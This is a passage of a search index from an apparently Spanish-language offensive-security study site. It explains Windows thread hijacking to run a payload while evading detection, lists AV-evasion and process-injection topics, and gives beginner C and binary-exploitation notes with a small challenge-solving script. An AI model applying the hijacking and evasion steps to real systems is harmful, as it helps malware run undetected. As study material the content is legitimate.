hilo principal, ya que es el que ejecuta el c\u00f3digo y no puede ser suspendido. Por lo tanto, no se debe apuntar al hilo principal cuando se realiza un hijacking de hilos local.</p> <p>Este m\u00f3dulo demostrar\u00e1 c\u00f3mo hijackear un hilo reci\u00e9n creado. Se llamar\u00e1 inicialmente a <code>CreateThread</code> para crear un hilo y establecer una funci\u00f3n benigna como entrada del hilo. Posteriormente, el handle del hilo ser\u00e1 utilizado para realizar los pasos necesarios para hijackear el hilo y ejecutar el payload en su lugar.</p>"},{"location":"WindowsHacking/threadHijacking/#modifying-the-threads-context","title":"Modifying The Thread's Context","text":"<p>El siguiente paso es obtener el contexto del hilo para modificarlo y hacer que apunte a un payload. Cuando el hilo reanude su ejecuci\u00f3n, el payload ser\u00e1 ejecutado.</p> <p>Como se mencion\u00f3 anteriormente, se utilizar\u00e1 <code>GetThreadContext</code> para obtener la estructura <code>CONTEXT</code> del hilo objetivo. Ciertos valores de esta estructura ser\u00e1n modificados para alterar el contexto actual del hilo utilizando <code>SetThreadContext</code>. Los valores que se modifican en la estructura son aquellos que determinan qu\u00e9 ejecutar\u00e1 el hilo a continuaci\u00f3n. Estos valores son los registros <code>RIP</code> (para procesadores de 64 bits) o <code>EIP</code> (para procesadores de 32 bits).</p> <p>Los registros <code>RIP</code> y <code>EIP</code>, tambi\u00e9n conocidos como registros de puntero de instrucci\u00f3n, indican la pr\u00f3xima instrucci\u00f3n a ejecutar. Estos se actualizan despu\u00e9s de que se ejecuta cada instrucci\u00f3n.</p>"},{"location":"WindowsHacking/threadHijacking/#setting-contextflags","title":"Setting ContextFlags","text":"<p>El segundo par\u00e1metro de <code>GetThreadContext</code>, <code>lpContext</code>, est\u00e1 marcado como un par\u00e1metro de entrada y salida (IN &amp; OUT). La secci\u00f3n de Remarks en la documentaci\u00f3n de Microsoft indica:</p> <p>La funci\u00f3n recupera un contexto selectivo basado en el valor del miembro <code>ContextFlags</code> de la estructura de contexto.</p> <p>En esencia, Microsoft establece que el campo <code>CONTEXT.ContextFlags</code> debe establecerse con un valor antes de llamar a la funci\u00f3n. <code>ContextFlags</code> se configura con la bandera <code>CONTEXT_CONTROL</code> para obtener el valor de los registros de control.</p> <p>Por lo tanto, establecer <code>CONTEXT.ContextFlags</code> en <code>CONTEXT_CONTROL</code> es necesario para realizar el hijacking de hilos. Alternativamente, tambi\u00e9n se puede usar <code>CONTEXT_ALL</code> para llevar a cabo el hijacking de hilos.</p>"},{"location":"WindowsHacking/threadHijacking/#thread-hijacking-function","title":"Thread Hijacking Function","text":"<p><code>RunViaClassicThreadHijacking</code> es una funci\u00f3n personalizada que realiza el hijacking de hilos. La funci\u00f3n requiere 3 argumentos:</p> <ul> <li><code>hThread</code>: Un handle a un hilo suspendido que ser\u00e1 hijackeado.</li> <li><code>pPayload</code>: Un puntero a la direcci\u00f3n base del payload.</li> <li><code>sPayloadSize</code>: El tama\u00f1o del payload.</li> </ul>"},{"location":"WindowsHacking/threadHijacking/#creating-the-sacrificial-thread","title":"Creating The Sacrificial Thread","text":"<p>Dado que <code>RunViaClassicThreadHijacking</code> requiere un handle a un hilo, la funci\u00f3n principal debe proporcionarlo. Como se mencion\u00f3 anteriormente, el hilo objetivo debe estar en un estado suspendido para que <code>RunViaClassicThreadHijacking</code> pueda hijackear el hilo con \u00e9xito.</p> <p>Se utilizar\u00e1 la WinAPI <code>CreateThread</code> para crear un nuevo hilo. El nuevo hilo debe parecer lo m\u00e1s benigno posible para evitar su detecci\u00f3n. Esto se puede lograr creando una funci\u00f3n benigna que sea ejecutada por este hilo reci\u00e9n creado.</p> <p>El siguiente paso es suspender el hilo reci\u00e9n creado para que <code>GetThreadContext</code> tenga \u00e9xito. Esto se puede realizar de dos maneras:</p> <ul> <li>Pasando la bandera <code>CREATE_SUSPENDED</code> en el par\u00e1metro <code>dwCreationFlags</code> de <code>CreateThread</code>. Esta bandera crear\u00e1 el hilo en un estado suspendido.</li> <li>Creando un hilo normal, pero suspendi\u00e9ndolo posteriormente utilizando la WinAPI <code>SuspendThread</code>.</li> </ul> <p>Se utilizar\u00e1 el primer m\u00e9todo, ya que requiere menos llamadas a la WinAPI. Sin embargo, ambos m\u00e9todos necesitar\u00e1n que el hilo sea reanudado despu\u00e9s de ejecutar <code>RunViaClassicThreadHijacking</code>. Esto se lograr\u00e1 utilizando la WinAPI <code>ResumeThread</code>, que solo requiere el handle del hilo suspendido.</p>"},{"location":"WindowsHacking/threadHijacking/#codigo","title":"C\u00f3digo","text":""},{"location":"WindowsHacking/windowsHackingIndex/","title":"Windows hacking resources","text":"<ul> <li> HackSys Extreme Vulnerable Driver (HEVD)</li> <li> GTFO bins for windows</li> <li> Anti Virus Evasion<ul> <li>Powershell ofuscation</li> </ul> </li> <li> Payloads cyphers techniques</li> <li>Local Payload Execution - DLL</li> <li>Process Injection</li> <li>Thread Hijacking</li> </ul>"},{"location":"bin-exploitation/bin-exploitation/","title":"Software exploitation basics","text":""},{"location":"bin-exploitation/bin-exploitation/#apuntes-de-ansi-c","title":"Apuntes de ANSI C","text":""},{"location":"bin-exploitation/bin-exploitation/#memory-corruption","title":"Memory Corruption","text":""},{"location":"bin-exploitation/bin-exploitation/#shell-coding","title":"Shell Coding","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/C/","title":"Apuntes de ANSI C","text":"<ul> <li>I/O</li> <li>Tipos de enteros</li> <li>Aritmetica</li> <li>Operadores bit a bit</li> <li>Introducci\u00f3n a memoria</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/","title":"Apuntes sobre Operadores Aritm\u00e9ticos en C","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#introduccion-a-los-operadores-aritmeticos","title":"Introducci\u00f3n a los Operadores Aritm\u00e9ticos","text":"<p>Con un entendimiento b\u00e1sico de los tipos enteros en C, podemos explorar c\u00f3mo estos tipos de variables se manipulan mediante operadores aritm\u00e9ticos. Estos operadores permiten realizar operaciones matem\u00e1ticas como suma, resta, multiplicaci\u00f3n, divisi\u00f3n y m\u00f3dulo. A continuaci\u00f3n, se detalla cada operador con ejemplos.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#suma","title":"Suma","text":"<p>El operador de suma es el m\u00e1s com\u00fan y se representa con el s\u00edmbolo <code>+</code>. Permite sumar dos valores enteros.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#ejemplo","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 1;\nunsigned int op2 = 3;\nunsigned int result = op1 + op2; // result = 4\n</code></pre> <p>En este ejemplo, se suman las variables <code>op1</code> y <code>op2</code>, y el resultado se almacena en la variable <code>result</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#resta","title":"Resta","text":"<p>El operador de resta se representa con el s\u00edmbolo <code>-</code>. Resta el valor de una variable de otra.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#ejemplo_1","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 5;\nunsigned int op2 = 3;\nunsigned int result = op1 - op2; // result = 2\n</code></pre> <p>Aqu\u00ed, el valor de <code>op2</code> se resta de <code>op1</code>, y el resultado se guarda en <code>result</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#multiplicacion","title":"Multiplicaci\u00f3n","text":"<p>El operador de multiplicaci\u00f3n se representa con el s\u00edmbolo <code>*</code>. Multiplica dos valores enteros.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#ejemplo_2","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x100; // 256 en decimal\nunsigned int op2 = 2;\nunsigned int result = op1 * op2; // result = 512\n</code></pre> <p>En este caso, se multiplica <code>op1</code> por <code>op2</code>, y el resultado se almacena en <code>result</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#division","title":"Divisi\u00f3n","text":"<p>El operador de divisi\u00f3n se representa con el s\u00edmbolo <code>/</code>. Divide un valor entero por otro.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#ejemplo_3","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x100; // 256 en decimal\nunsigned int op2 = 2;\nunsigned int result = op1 / op2; // result = 128\n</code></pre> <p>Aqu\u00ed, <code>op1</code> se divide entre <code>op2</code>, y el resultado se guarda en <code>result</code>.</p> <p>Nota: Dividir por cero es una operaci\u00f3n inv\u00e1lida y, en sistemas como Linux, genera una se\u00f1al <code>SIGFPE</code> (error/excepci\u00f3n).</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#modulo","title":"M\u00f3dulo","text":"<p>El operador de m\u00f3dulo se representa con el s\u00edmbolo <code>%</code> y calcula el resto de una divisi\u00f3n entre dos n\u00fameros.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#ejemplo_4","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x100; // 256 en decimal\nunsigned int op2 = 2;\nunsigned int result = op1 % op2; // result = 0\n</code></pre> <p>El m\u00f3dulo es \u00fatil para limitar un n\u00famero dentro de un rango espec\u00edfico. Por ejemplo, el siguiente c\u00f3digo asegura que no se acceda fuera de los l\u00edmites de un arreglo:</p> <pre><code>int numbers[16] = {};\nfor (int i = 0; i &lt; 100; i++) {\n    numbers[i % 16] += 1; // Incrementa el elemento correspondiente\n}\n</code></pre> <p>En este caso, el operador <code>%</code> garantiza que el \u00edndice <code>i</code> se mantenga dentro del rango de 0 a 15, recorriendo el arreglo <code>numbers</code> varias veces sin desbordar sus l\u00edmites.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/arithmetic/#conclusion","title":"Conclusi\u00f3n","text":"<p>Los operadores aritm\u00e9ticos en C (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>) son herramientas esenciales para manipular tipos enteros. Comprender su funcionamiento, incluyendo casos especiales como la divisi\u00f3n por cero o el uso del m\u00f3dulo para controlar rangos, es fundamental en la programaci\u00f3n de bajo nivel, especialmente en contextos como la explotaci\u00f3n de binarios.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/","title":"Apuntes sobre Operadores Bit a Bit en C","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#introduccion-a-los-operadores-bit-a-bit","title":"Introducci\u00f3n a los Operadores Bit a Bit","text":"<p>Los operadores bit a bit en C permiten manipular los patrones de bits de los valores enteros a nivel binario, en contraste con los operadores aritm\u00e9ticos que operan sobre n\u00fameros completos. Estos operadores son esenciales en programaci\u00f3n de bajo nivel, como en la explotaci\u00f3n de binarios, donde es crucial entender la representaci\u00f3n binaria de los enteros.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo-de-representacion","title":"Ejemplo de Representaci\u00f3n","text":"Formato Valor Impreso HEX 0x41414141 DECIMAL 1094795585 BINARY 0100 0001 0100 0001 0100 0001 0100 0001"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#operador-or-bit-a-bit","title":"Operador OR Bit a Bit","text":"<p>El operador OR bit a bit (<code>|</code>) combina los bits de dos operandos, estableciendo un <code>1</code> en el resultado si al menos uno de los bits correspondientes en los operandos es <code>1</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int op2 = 0x42424242;\nunsigned int result = op1 | op2; // result = 0x43434343\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#representacion-binaria","title":"Representaci\u00f3n Binaria","text":"Nombre Hex Binario op1 0x41414141 0100 0001 0100 0001 0100 0001 0100 0001 op2 0x42424242 0100 0010 0100 0010 0100 0010 0100 0010 result 0x43434343 0100 0011 0100 0011 0100 0011 0100 0011"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#operador-and-bit-a-bit","title":"Operador AND Bit a Bit","text":"<p>El operador AND bit a bit (<code>&amp;</code>) preserva solo los bits <code>1</code> que est\u00e1n presentes en ambos operandos.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo_1","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int op2 = 0x42424242;\nunsigned int result = op1 &amp; op2; // result = 0x40404040\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#representacion-binaria_1","title":"Representaci\u00f3n Binaria","text":"Nombre Hex Binario op1 0x41414141 0100 0001 0100 0001 0100 0001 0100 0001 op2 0x42424242 0100 0010 0100 0010 0100 0010 0100 0010 result 0x40404040 0100 0000 0100 0000 0100 0000 0100 0000 <p>Uso com\u00fan: Este operador se utiliza frecuentemente para enmascarar bits, eliminando bits no deseados.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#operador-xor-bit-a-bit","title":"Operador XOR Bit a Bit","text":"<p>El operador XOR bit a bit (<code>^</code>) establece un bit <code>1</code> en el resultado solo si exactamente uno de los bits correspondientes en los operandos es <code>1</code>. Es com\u00fan en funciones criptogr\u00e1ficas.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo_2","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int op2 = 0x42424242;\nunsigned int result = op1 ^ op2; // result = 0x03030303\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#representacion-binaria_2","title":"Representaci\u00f3n Binaria","text":"Nombre Hex Binario op1 0x41414141 0100 0001 0100 0001 0100 0001 0100 0001 op2 0x42424242 0100 0010 0100 0010 0100 0010 0100 0010 result 0x03030303 0000 0011 0000 0011 0000 0011 0000 0011"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#operador-not-bit-a-bit","title":"Operador NOT Bit a Bit","text":"<p>El operador NOT bit a bit (<code>~</code>) invierte todos los bits de un operando, convirtiendo los <code>1</code> en <code>0</code> y viceversa.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo_3","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int result = ~op1; // result = 0xBEBEBEBE\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#representacion-binaria_3","title":"Representaci\u00f3n Binaria","text":"Nombre Hex Binario op1 0x41414141 0100 0001 0100 0001 0100 0001 0100 0001 result 0xBEBEBEBE 1011 1110 1011 1110 1011 1110 1011 1110"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#desplazamiento-a-la-izquierda-shift-left","title":"Desplazamiento a la Izquierda (Shift Left)","text":"<p>El operador de desplazamiento a la izquierda (<code>&lt;&lt;</code>) mueve los bits de un entero hacia la izquierda, rellenando con ceros los bits vac\u00edos a la derecha.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo_4","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int op2 = 8;\nunsigned int result = op1 &lt;&lt; op2;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo-visual-con-0x0000ffff","title":"Ejemplo Visual (con 0x0000FFFF)","text":"Nombre Hex Binario op1 0x0000FFFF 0000 0000 0000 0000 1111 1111 1111 1111 op2 0x00000008 0000 0000 0000 0000 0000 0000 0000 1000 result 0x00FFFF00 0000 0000 1111 1111 1111 1111 0000 0000"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#desplazamiento-a-la-derecha-shift-right","title":"Desplazamiento a la Derecha (Shift Right)","text":"<p>El operador de desplazamiento a la derecha (<code>&gt;&gt;</code>) mueve los bits de un entero hacia la derecha, rellenando los bits vac\u00edos a la izquierda (con ceros para enteros sin signo).</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo_5","title":"Ejemplo","text":"<pre><code>unsigned int op1 = 0x41414141;\nunsigned int op2 = 8;\nunsigned int result = op1 &gt;&gt; op2;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#ejemplo-visual-con-0xffff0000","title":"Ejemplo Visual (con 0xFFFF0000)","text":"Nombre Hex Binario op1 0xFFFF0000 1111 1111 1111 1111 0000 0000 0000 0000 op2 0x00000008 0000 0000 0000 0000 0000 0000 0000 1000 result 0x00FFFF00 0000 0000 1111 1111 1111 1111 0000 0000"},{"location":"bin-exploitation/ret2war-notes/level-1/bitwise/#conclusion","title":"Conclusi\u00f3n","text":"<p>Los operadores bit a bit (<code>|</code>, <code>&amp;</code>, <code>^</code>, <code>~</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>) son herramientas poderosas para manipular los bits de los enteros en C. Su comprensi\u00f3n es crucial en entornos de bajo nivel, como la explotaci\u00f3n de binarios, donde el control preciso de los bits puede ser necesario para tareas como enmascaramiento, cifrado o manipulaci\u00f3n de datos a nivel binario.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/","title":"I/O - E/S","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#entrada-y-salida-io","title":"Entrada y Salida (I/O)","text":"<p>El lenguaje de programaci\u00f3n C proporciona varias formas de realizar tareas de entrada y salida (I/O). La entrada y salida son conceptos fundamentales en la inform\u00e1tica, ya que permiten que los usuarios y aplicaciones externas interact\u00faen con un programa para completar alguna acci\u00f3n.</p> <p>De manera simple, la entrada se refiere a cualquier dato que se puede proporcionar a un programa en ejecuci\u00f3n. Por otro lado, la salida es la informaci\u00f3n que el programa puede mostrar en la terminal o escribir en un archivo.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#entrada-y-salida-de-bajo-nivel","title":"Entrada y Salida de Bajo Nivel","text":"<p>En C, las funciones de bajo nivel como <code>read()</code> y <code>write()</code> permiten realizar operaciones de entrada y salida directamente con descriptores de archivo (file descriptors). Estas funciones son \u00fatiles para leer datos desde archivos o desde la entrada est\u00e1ndar (stdin) y escribir datos en la salida est\u00e1ndar (stdout).</p> <p>Por ejemplo, la funci\u00f3n <code>read()</code> lee datos arbitrarios hasta un n\u00famero especificado de bytes y los almacena en un b\u00fafer. De manera similar, <code>write()</code> se utiliza para enviar datos desde el programa hacia un destino, como la terminal o un archivo.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#entrada-y-salida-de-alto-nivel","title":"Entrada y Salida de Alto Nivel","text":"<p>Las funciones de alto nivel como <code>fgets()</code> y <code>printf()</code> son m\u00e1s comunes en aplicaciones C. Estas funciones proporcionan una interfaz m\u00e1s sencilla para trabajar con datos de entrada y salida.</p> <ul> <li><code>fgets()</code>: Se utiliza para leer texto desde la entrada est\u00e1ndar o un archivo. Esta funci\u00f3n detiene la lectura al encontrar un car\u00e1cter de nueva l\u00ednea (<code>\\n</code>) o al alcanzar un l\u00edmite de bytes especificado.</li> <li><code>printf()</code>: Permite formatear y mostrar mensajes en la salida est\u00e1ndar. Utiliza especificadores de formato como <code>%s</code> para imprimir cadenas, <code>%d</code> para enteros, entre otros.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#estas-funciones-son-ideales-para-trabajar-con-datos-estructurados-y-para-interactuar-con-los-usuarios-de-manera-mas-intuitiva","title":"Estas funciones son ideales para trabajar con datos estructurados y para interactuar con los usuarios de manera m\u00e1s intuitiva.","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#entrada-y-salida-de-bajo-nivel-con-ejemplo","title":"Entrada y Salida de Bajo Nivel con Ejemplo","text":"<p>En C, las funciones de bajo nivel como <code>read()</code> y <code>write()</code> trabajan directamente con descriptores de archivo y manejan datos en forma de bytes crudos. Esto significa que no procesan los datos ni aplican formatos, simplemente leen o escriben los bytes tal como est\u00e1n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#ejemplo-de-uso","title":"Ejemplo de Uso","text":"<p>El siguiente ejemplo muestra c\u00f3mo se pueden usar <code>read()</code> y <code>write()</code> para interactuar con el usuario a trav\u00e9s de la entrada y salida est\u00e1ndar:</p> <pre><code>#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\nvoid demo_data() \n{\n    // Mensaje inicial para el usuario\n    const char *prompt = \"Enter data: \";\n    write(STDOUT_FILENO, prompt, strlen(prompt));\n\n    // B\u00fafer para almacenar la entrada del usuario\n    char buffer[32] = {};\n\n    // Leer datos desde la entrada est\u00e1ndar\n    int n = read(STDIN_FILENO, buffer, sizeof(buffer));\n\n    // Mostrar los datos le\u00eddos al usuario\n    const char *output = \"The program read in:\\n\";\n    write(STDOUT_FILENO, output, strlen(output));\n    write(STDOUT_FILENO, buffer, n);\n}\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#explicacion-del-codigo","title":"Explicaci\u00f3n del C\u00f3digo","text":"<ol> <li> <p><code>write(STDOUT_FILENO, prompt, strlen(prompt));</code>    Escribe un mensaje en la salida est\u00e1ndar (la terminal) para solicitar datos al usuario.</p> </li> <li> <p><code>read(STDIN_FILENO, buffer, sizeof(buffer));</code>    Lee hasta 32 bytes de datos desde la entrada est\u00e1ndar (teclado) y los almacena en el b\u00fafer.</p> </li> <li> <p><code>write(STDOUT_FILENO, buffer, n);</code>    Escribe los datos ingresados por el usuario de vuelta a la salida est\u00e1ndar.</p> </li> </ol> <p>Este enfoque es \u00fatil cuando se necesita un control preciso sobre los datos sin aplicar ning\u00fan procesamiento adicional, como el manejo de caracteres de nueva l\u00ednea o el formateo de cadenas.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/input-output/#python-script-para-el-challenge","title":"Python script para el challenge","text":"<pre><code>import interact\nimport struct\n\np = interact.Process()\n\n# Men\u00fa principal\np.readuntil('Enter Choice')\np.sendline('1')  # Low Level IO\n\n# Payload correcto (sin '!')\np.readuntil('Enter data:')\np.sendline(b'Hello\\nWorld!\\n\\xC0\\xDE\\xF0\\x0D')\n\n# Entramos al quiz\np.readuntil('Press enter to start quiz...')\np.sendline('')\n\n# Enviamos string literal exacto\np.readuntil('Enter Answer:')\np.sendline(b'Hello\\nWorld!\\n\\xC0\\xDE\\xF0\\x0D')\n\n# Entramos en modo interactivo\np.interactive()\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/","title":"Apuntes sobre Tipos Enteros en C","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#introduccion-a-los-tipos-enteros","title":"Introducci\u00f3n a los Tipos Enteros","text":"<p>En el lenguaje de programaci\u00f3n C, los tipos enteros son fundamentales para almacenar n\u00fameros enteros. Estos tipos son esenciales en entornos de bajo nivel, como en la explotaci\u00f3n de binarios, debido a sus propiedades espec\u00edficas. A continuaci\u00f3n, se exploran los tipos enteros sin signo (unsigned) y con signo (signed), sus l\u00edmites, y los conceptos de overflow y underflow.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#enteros-sin-signo-unsigned-integers","title":"Enteros sin Signo (Unsigned Integers)","text":"<p>Los enteros sin signo son el tipo m\u00e1s b\u00e1sico de entero en C y est\u00e1n dise\u00f1ados para almacenar solo n\u00fameros positivos. Generalmente, ocupan 32 bits (4 bytes) en la mayor\u00eda de los sistemas.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#declaracion","title":"Declaraci\u00f3n","text":"<pre><code>unsigned int bar = 44;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#impresion","title":"Impresi\u00f3n","text":"<ul> <li>En base 10: Usa el especificador de formato <code>%u</code>.</li> <li>En base 16 (hexadecimal): Usa <code>0x%X</code>.</li> </ul> <pre><code>printf(\"bar is %u\\n\", bar); // Imprime: bar is 44\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#enteros-con-signo-signed-integers","title":"Enteros con Signo (Signed Integers)","text":"<p>Los enteros con signo pueden almacenar tanto n\u00fameros positivos como negativos. Esto reduce el rango de valores positivos que pueden representar en comparaci\u00f3n con los enteros sin signo.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#declaracion_1","title":"Declaraci\u00f3n","text":"<pre><code>int foo = -44;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#impresion_1","title":"Impresi\u00f3n","text":"<ul> <li>Usa el especificador de formato <code>%d</code> para mostrar el valor en base 10.</li> </ul> <pre><code>printf(\"foo is %d\\n\", foo); // Imprime: foo is -44\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#limites-de-los-enteros-sin-signo","title":"L\u00edmites de los Enteros sin Signo","text":"<p>Los enteros sin signo tienen un rango finito de valores. Por ejemplo, un entero sin signo de 32 bits puede almacenar valores desde 0 hasta 4294967295 (<code>0xFFFFFFFF</code> en hexadecimal). A continuaci\u00f3n, se muestran los l\u00edmites de algunos tipos comunes:</p> Tipo M\u00ednimo M\u00e1ximo uint8_t 0 255 uint16_t 0 65535 uint32_t 0 4294967295 uint64_t 0 18446744073709551615 unsigned int 0 4294967295"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#limites-de-los-enteros-con-signo","title":"L\u00edmites de los Enteros con Signo","text":"<p>Los enteros con signo de 32 bits tienen un rango que va desde -2147483648 hasta 2147483647. Esto se debe a que el bit m\u00e1s significativo se usa para indicar el signo del n\u00famero, siguiendo el sistema de complemento a dos.</p> Tipo M\u00ednimo M\u00e1ximo int8_t -128 127 int16_t -32768 32767 int32_t -2147483648 2147483647 int64_t -9223372036854775808 9223372036854775807 int -2147483648 2147483647"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#desbordamiento-de-enteros-overflow","title":"Desbordamiento de Enteros (Overflow)","text":"<p>Cuando un entero supera su valor m\u00e1ximo, ocurre un overflow, y el valor se reinicia al m\u00ednimo. Por ejemplo, en un entero sin signo de 32 bits:</p> <pre><code>u32 es 4294967293 (0xFFFFFFFD), incrementando...\nu32 es 4294967294 (0xFFFFFFFE), incrementando...\nu32 es 4294967295 (0xFFFFFFFF), incrementando...\nu32 es 0 (0x00000000), incrementando...\nu32 es 1 (0x00000001), incrementando...\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#subdesbordamiento-de-enteros-underflow","title":"Subdesbordamiento de Enteros (Underflow)","text":"<p>De manera similar, cuando un entero disminuye por debajo de su valor m\u00ednimo, ocurre un underflow, y el valor pasa al m\u00e1ximo. Por ejemplo, en un entero sin signo de 32 bits:</p> <pre><code>u32 es 3 (0x00000003), decrementando...\nu32 es 2 (0x00000002), decrementando...\nu32 es 1 (0x00000001), decrementando...\nu32 es 0 (0x00000000), decrementando...\nu32 es 4294967295 (0xFFFFFFFF), decrementando...\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/integer-types/#overflow-y-underflow-en-enteros-con-signo","title":"Overflow y Underflow en Enteros con Signo","text":"<p>Los enteros con signo tambi\u00e9n experimentan overflow y underflow, pero el comportamiento es diferente debido al bit de signo. El umbral de overflow para un entero con signo de 32 bits ocurre en <code>0x7FFFFFFF</code>:</p> <pre><code>s32 es 2147483645 (0x7FFFFFFD), incrementando...\ns32 es 2147483646 (0x7FFFFFFE), incrementando...\ns32 es 2147483647 (0x7FFFFFFF), incrementando...\ns32 es -2147483648 (0x80000000), incrementando...\ns32 es -2147483647 (0x80000001), incrementando...\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/","title":"Apuntes sobre Memoria en C","text":""},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#introduccion-a-la-gestion-de-memoria","title":"Introducci\u00f3n a la Gesti\u00f3n de Memoria","text":"<p>C, como lenguaje de bajo nivel, permite un control preciso sobre la memoria en tiempo de ejecuci\u00f3n. Un programador experto en C debe conocer cu\u00e1ntos bytes ocupa una variable, d\u00f3nde se almacenan los datos en memoria y c\u00f3mo se formatean o acceden durante la ejecuci\u00f3n. Esto es crucial en contextos como la explotaci\u00f3n de binarios.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#buffers","title":"Buffers","text":"<p>Un buffer es un bloque de memoria reservado para almacenar datos arbitrarios, como entradas de usuario. En C, los buffers suelen declararse como arreglos.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#ejemplo","title":"Ejemplo","text":"<pre><code>// Reserva un buffer de 16 bytes en el stack\nchar buffer[16] = {};\n</code></pre> <p>En este caso, se asigna un buffer de 16 bytes en el stack, inicializando todos sus bytes a <code>0</code> mediante las llaves <code>{}</code>.</p>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#visualizacion-del-buffer","title":"Visualizaci\u00f3n del Buffer","text":"<pre><code>------------------------------------------------------------\n-- Visualizaci\u00f3n de Buffer #1\n------------------------------------------------------------\n\n                . . . . . . . . . . . . . . . . . . . . . .\n\n                +------------------ 0x7fffffffed80 -----------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +---------------------------------------+\n                | 04 | 30 | 40 | 00 | 00 | 00 | 00 | 00 |\n                +------------------ 0x7fffffffed90 -----------------+\n buffer -----&gt;  | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n                +---------------------------------------+\n                | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |\n                +---------------------------------------+\n                | B0 | ED | FF | FF | FF | 7F | 00 | 00 |\n                +------------------ 0x7fffffffeda8 -----------------+\n\n                . . . . . . . . . . . . . . . . . . . . . .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-1/memory-intro/#llenado-de-buffers","title":"Llenado de Buffers","text":"<p>Un buffer puede llenarse con datos, como una cadena est\u00e1tica, utilizando funciones como 